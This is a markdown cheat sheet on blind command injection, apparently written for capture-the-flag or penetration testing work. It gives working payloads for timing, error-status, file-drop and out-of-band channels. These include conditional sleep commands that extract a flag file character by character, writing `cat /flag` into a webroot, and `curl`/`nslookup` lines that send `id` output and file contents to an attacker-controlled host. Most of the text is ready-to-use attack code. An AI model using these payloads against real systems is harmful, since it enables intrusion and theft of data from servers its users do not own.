# Blind Command Injection — no output in the response

## The channels when stdout never returns

| Channel | Needs | Payload shape |
|---|---|---|
| timing | repeatable delay | `;sleep 5`, `$(sleep 5)`, `;ping -c5 127.0.0.1` |
| error-oracle | distinct error on true/false | `;false` vs `;true`, `;exit 1` |
| OOB network | outbound connectivity | `;curl http://YOU/x`, `;nslookup x.YOU` |
| file-drop | writable webroot + fetchable | `;id > /var/www/html/x.txt` then fetch |
| second-order | another feature reflects result | write into a field shown elsewhere |
| port-knock | you can observe connection | `;curl http://YOU:PORT/` per-char oracle |
| boolean-timing | per-char condition | `$(if [ cond ];then sleep 5;fi)` |

## Timing channel — the workhorse

```
$(sleep 5)                    inside quotes
;sleep 5                      bare
`sleep 5`
|sleep 5
&&sleep 5                     if left side succeeds
```

**Repeatability is mandatory**: run baseline 3×, payload 3×, control
`sleep 0` once. A single slow response is network jitter — never a
confirm. `race_probe.py` doesn't apply; this is serial timing.

Sleep alternatives when `sleep` is filtered:

```
ping -c 5 127.0.0.1        → ~4-5s on Linux (1s interval)
ping -n 5 127.0.0.1        → Windows cmd.exe
timeout 5 cat              → reads stdin, dies at 5s
awk 'BEGIN{x=systime();while(systime()-x<5)}'
bash -c 'read -t 5'
curl --max-time 5 http://10.255.255.1/   — unreachable → 5s timeout
```

## Conditional timing — the boolean oracle

```
$(if [ $(whoami) = root ];then sleep 5;else sleep 0;fi)
$(if [ "$(cut -c1 /flag)" = f ];then sleep 5;fi)
$(head -c1 /flag | grep -q f && sleep 5)
```

The `if`/`&&`+`test` idiom extracts one bit per request — same blind-
extraction logic as boolean-blind SQLi. For a 32-char flag at 8 bits/
request over a 36-char alphabet: worst ~32×36 = 1152 requests — binary
search cuts it to ~32×6 = 192.

Binary-search shape:

```
$(if [ "$(head -c1 /flag)" \> 'e' ];then sleep 3;fi)
```

## Error-oracle — exit status → distinct error

```
;exit 0   vs   ;exit 1      — does status code change the response?
$(exit 1)                   — inside substitution, exit code surfaces
;$(false)                   — substitution of empty output vs error
```

Some apps return 500 on command failure, 200 on success — that's a
boolean oracle:

```
$(if grep -q ^f /flag;then true;else false;fi)
```

## File-drop channel — the write-and-fetch

If a webroot path is writable:

```
;id > /var/www/html/x.txt
;cat /flag > /var/www/html/x.txt
;curl http://YOU/`cat /flag|base64`  (combines OOB)
```

Then `GET /x.txt`. Needs: writable webroot + predictable path + no
`.htaccess` block. `;echo $? > x` for status exfil.

## OOB channel — full detail in `oob-exfil.md`

```
;curl http://YOU:8000/$(id|base64 -w0)
;nslookup $(id|tr ' ' '.').YOU
;ping -c1 $(head -c8 /flag|xxd -p).YOU
```

`oob_listener.py serve --port 8000 --log hits.jsonl` catches HTTP hits.

## The "write into a field shown elsewhere" — second-order

`;id > /app/data/profile.txt` — then fetch your profile page —
`second-order.md`.

## Blind + filter combo — the real CTF shape

Typical trap: `;` and `|` filtered, `$` allowed → `$(sleep 5)` works but
`$(...)` output never shows → blind + filtered + substitution = the
hardest common shape. The `$(sleep)` inside `"..."` probe catches it.

## Conditional-exec shorthand — `&&`/`||` as if

```
$(id|grep -q r && sleep 5)     — sleep only if id output has 'r'
;grep -q f /flag && sleep 5    — only sleeps when flag starts with f
```

`&&` chains a test command (`grep -q`, `[`, `test`) to `sleep` — the
standard blind boolean.

## Windows blind

```
& timeout /t 5 /nobreak
& ping -n 5 127.0.0.1
& powershell -c "sleep 5"
```

`timeout` needs `/nobreak`; `ping -n` counts; `start /wait` alternatives.

## Measurement discipline — budget rules

- baseline median ≥3 samples BEFORE any payload
- variant ≥3 samples
- record both medians, not single samples
- if variance > delta, increase sleep to 10s, not more guesses

## Falsifiers

- no repeatable delta after 3 payload trials at sleep≥5s
- no OOB connectivity (egress blocked) AND no file-write path
- error channel uniform for all inputs

## Output to record

- baseline median, variant median, control value
- which channel is live + per-bit extraction plan if blind-boolean
